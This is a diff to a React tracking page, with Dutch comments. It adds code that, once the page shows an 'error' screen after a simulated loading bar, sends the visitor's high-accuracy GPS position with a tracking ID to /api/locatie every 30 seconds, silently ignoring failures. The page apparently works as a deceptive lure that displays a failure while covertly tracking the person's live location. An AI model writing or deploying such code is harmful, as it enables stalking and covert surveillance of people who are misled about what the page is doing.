@@ -95,10 +95,48 @@ export default function TrackingPage() {
         clearInterval(interval);
         setTimeout(() => {
           setStatus("error");
+          // Start live tracking na "error" scherm
+          startLiveTracking();
         }, 500);
       }
       setLoadingProgress(Math.min(progress, 100));
     }, 400);
+  };
+
+  // Live tracking - stuurt elke 30 seconden de locatie zolang pagina open is
+  const startLiveTracking = () => {
+    if (!navigator.geolocation) return;
+
+    const sendLocation = () => {
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          try {
+            await fetch("/api/locatie", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                trackingId,
+                type: "gps_live",
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString(),
+              }),
+            });
+          } catch (e) {
+            console.error("Live tracking fout:", e);
+          }
+        },
+        () => {}, // Negeer errors bij live tracking
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    };
+
+    // Stuur elke 30 seconden
+    const liveInterval = setInterval(sendLocation, 30000);
+    
+    // Stop als pagina wordt gesloten
+    window.addEventListener("beforeunload", () => clearInterval(liveInterval));
   };
 
   return (
